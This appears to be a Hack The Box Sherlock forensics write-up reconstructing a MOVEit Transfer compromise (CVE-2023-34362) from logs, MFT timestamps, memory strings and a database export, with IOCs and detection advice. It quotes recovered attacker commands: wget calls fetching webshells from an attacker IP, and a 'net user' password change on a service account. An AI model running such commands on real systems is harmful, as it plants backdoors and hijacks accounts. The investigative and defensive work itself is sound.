
<div align="center">

# i-like-to

![Category](https://img.shields.io/badge/Category-Digital%20Forensics-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Focus](https://img.shields.io/badge/Focus-MOVEit%20Exploitation-red)

**HTB Sherlock — Incident Response & Forensics**

</div>

---

## Machine Overview

| Field | Details |
|---|---|
| Name | i-like-to |
| Difficulty | Easy |
| Platform | Windows |
| Scenario | MOVEit Transfer compromise |
| Primary Vulnerability | CVE-2023-34362 |
| Main Objective | Reconstruct the exploitation and post-compromise activity |

## Objectives

- Identify the attacker's IP address and initial reconnaissance activity.
- Correlate IIS logs, the NTFS Master File Table (MFT), Windows Event Logs, and memory strings.
- Identify the deployed webshells and the command used to retrieve them.
- Establish account manipulation and remote access activity.
- Extract the attacker's MOVEit instance ID.

## 1. Evidence Collection

The supplied archive contains a memory image and a triage collection.

| Artifact | Details |
|---|---|
| Archive | `i-like-to.zip` |
| SHA-1 | `11a9802c2001aa919b94cb701d5201b66346dd3f` |
| Archive password | `hacktheblue` |
| Memory image | `I-like-to-27a787c5.vmem` |
| Triage archive | `Triage.zip` |
| Database export | `Triage/uploads/moveit.sql` |

The triage includes IIS logs, the MFT, Windows Event Logs, PSReadLine artifacts, and the MOVEit database export.

The memory image could not be processed with the documented Volatility workflow because the corresponding VMSS file was unavailable. Instead, strings were extracted directly from the `.vmem` file.

## 2. Initial Reconnaissance

**Evidence source:** IIS logs (`u_ex230712.log`).

The first observed Nmap-related request occurred at `2023-07-12 10:08:39 UTC`. The scan activity ended at `10:11:23 UTC`.

The identifying user-agent was:

    Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

The requests included checks against `/`, `/robots.txt`, and `/nmaplowercheck1689156596`.

| Finding | Value |
|---|---|
| Source IP | `10.255.254.3` |
| Reconnaissance tool | Nmap |
| Start | `2023-07-12 10:08:39 UTC` |
| End | `2023-07-12 10:11:23 UTC` |

## 3. MOVEit Exploitation

The first identified exploitation indicator appeared at `10:21:53 UTC`, when IIS logs recorded a POST request to:

    /machine2.aspx

Subsequent requests included:

    /moveitisapi/moveitisapi.dll?action=m2
    /guestaccess.aspx
    /api/v1/token
    /api/v1/folders
    /api/v1/folders/966794435/files

The requests originated from `10.255.254.3` and used the `Ruby` user-agent during the initial exploitation sequence.

The activity is consistent with exploitation of MOVEit Transfer via **CVE-2023-34362**. Later requests show the attacker interacting with MOVEit endpoints and attempting file operations.

## 4. Webshell Discovery

### 4.1 `moveit.asp`

IIS logs and memory strings revealed attempts to access and retrieve `moveit.asp`.

The memory image contained the following commands:

    wget http://10.255.254.3:9001/moveit.asp
    wget http://10.255.254.3:9001/moveit.asp -OutFile moveit.asp

The file was associated with:

    C:\inetpub\wwwroot\moveit.asp

The investigation identified this as an ASP webshell attempt that did not function as expected. Its reported file size was **1,362 bytes**.

### 4.2 `move.aspx`

The MFT analysis identified `move.aspx` under the MOVEit web root:

    .\MOVEitTransfer\wwwroot\move.aspx

The corresponding IIS activity occurred around `11:24 UTC`, and the MFT placed the file's upload at:

    2023-07-12 11:24:30 UTC

Memory strings confirmed the retrieval command and destination path:

    wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx

    C:\MOVEitTransfer\wwwroot\move.aspx

The recovered ASP.NET page contained the title:

    awen asp.net webshell

It also included a command input field with `whoami` as its default value, supporting its identification as a command-execution webshell.

**Key finding:** `move.aspx` was the ASPX webshell deployed by the attacker.

## 5. Service Account Compromise

Memory strings revealed a command targeting the MOVEit service account:

    net user "moveitsvc" 5trongP4ssw0rd

This indicated that the account password had been changed. Windows Security Event ID **4724** was used to investigate the password-change activity.

The event confirmed that the password for `moveitsvc` was modified at:

    2023-07-12 11:09:27 UTC

The documented command identifies the new password as `5trongP4ssw0rd`.

## 6. Remote Access

Windows Security Event ID **4624** was used to identify successful logons.

The investigation confirmed a successful RDP logon using the `moveitsvc` account at:

    2023-07-12 11:11:18 UTC

| Field | Finding |
|---|---|
| Account | `moveitsvc` |
| Protocol | RDP |
| Port | `3389` |
| Successful logon | `2023-07-12 11:11:18 UTC` |

The password change preceded the successful remote logon, establishing a clear sequence of account manipulation followed by remote access.

## 7. MOVEit Instance ID

The `moveit.sql` database export was imported into MySQL for examination.

Reviewing the database's `log` table showed that, following anonymous access, an account was created to provision access with the instance ID:

    1234

This value was identified as the attacker's `inst_id`.

## 8. Incident Timeline

All timestamps below are reported in UTC, as documented in the source writeup.

| Timestamp — 2023-07-12 | Event |
|---|---|
| `10:08:39` | Nmap reconnaissance begins from `10.255.254.3`. |
| `10:11:23` | Last observed Nmap reconnaissance request. |
| `10:21:53` | First identified exploitation indicator: POST to `/machine2.aspx`. |
| `11:09:27` | `moveitsvc` password changed. |
| `11:11:18` | Successful RDP logon using `moveitsvc`. |
| `11:18:36` | IIS logs show a request for `moveit.asp`. |
| `11:19:37` | Potential malicious `moveit.asp` upload identified in the MFT timeline. |
| `11:24:30` | `move.aspx` webshell upload timestamp identified in the MFT. |
| `11:26:01` | Memory image acquisition time. |

## 9. Indicators of Compromise

### Network

| Indicator | Value |
|---|---|
| Attacker IP | `10.255.254.3` |
| Webshell hosting URL | `http://10.255.254.3:9001/move.aspx` |
| Additional webshell URL | `http://10.255.254.3:9001/moveit.asp` |

### Files

| File | Location / Details |
|---|---|
| `move.aspx` | `C:\MOVEitTransfer\wwwroot\move.aspx` |
| `moveit.asp` | `C:\inetpub\wwwroot\moveit.asp` |
| `move.aspx` title | `awen asp.net webshell` |
| `moveit.asp` size | `1,362 bytes` |

### Account and Database

| Indicator | Value |
|---|---|
| Service account | `moveitsvc` |
| Password-change command | `net user "moveitsvc" 5trongP4ssw0rd` |
| Attacker instance ID | `1234` |

## 10. Detection and Hunting Recommendations

Based on the observed activity, prioritize monitoring for:

- Unusual requests to `/moveitisapi/moveitisapi.dll?action=m2`.
- Suspicious access to `/machine2.aspx`, particularly POST requests.
- Requests to `/guestaccess.aspx` associated with unexpected authentication or database activity.
- Unexpected files such as `move.aspx` under `MOVEitTransfer\wwwroot`.
- Unexpected ASP files, including `moveit.asp`, in web-accessible directories.
- Security Event ID `4724` involving service accounts.
- Security Event ID `4624` indicating successful RDP logons involving service accounts.
- Connections to suspicious hosts serving webshell files, including activity on port `9001`.

Correlate IIS logs, file-system metadata, Windows Security events, and database records rather than relying on a single indicator.

## 11. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Exploit Public-Facing Application | T1190 | MOVEit exploitation associated with CVE-2023-34362 |
| Network Service Discovery | T1046 | Nmap reconnaissance observed in IIS logs |
| External Remote Services | T1133 | RDP access to the compromised host |
| Server Software Component: Web Shell | T1505.003 | ASP/ASPX webshell artifacts and command-execution interface |
| Valid Accounts | T1078 | Successful remote logon using the `moveitsvc` account |

*Mappings are analytical classifications of the documented behavior.*

## Summary

The investigation reconstructed a MOVEit Transfer compromise beginning with Nmap reconnaissance from `10.255.254.3`, followed by exploitation indicators associated with CVE-2023-34362. The attacker activity included attempts to deploy webshells, a password change to the `moveitsvc` account, and successful RDP access. Analysis of the MOVEit database export revealed the instance ID `1234`.

The most useful evidence came from correlating IIS access logs, MFT timestamps, Windows Security events, memory strings, and the MOVEit database export.

## Key Takeaways

- IIS logs can reveal reconnaissance and exploitation sequences.
- MFT timestamps help validate the presence and timing of suspicious webshells.
- Memory strings can recover commands and artifacts when a full memory-analysis workflow is unavailable.
- Event IDs `4724` and `4624` help establish account manipulation and successful logon activity.
- Database logs can provide additional context that is not apparent from web logs alone.

## Skills Demonstrated

- Windows digital forensics and incident response
- IIS log analysis
- MOVEit Transfer exploitation investigation
- MFT and file-timeline analysis
- Windows Security Event Log analysis
- Memory-string analysis
- MySQL database artifact examination
- Incident timeline reconstruction
- IOC extraction and detection engineering

## Attack Chain

    Nmap Reconnaissance
            |
            v
    MOVEit Exploitation Indicators
    (CVE-2023-34362)
            |
            v
    Webshell Activity
    (moveit.asp / move.aspx)
            |
            v
    moveitsvc Password Change
            |
            v
    Successful RDP Logon
            |
            v
    Database Analysis
    (inst_id: 1234)
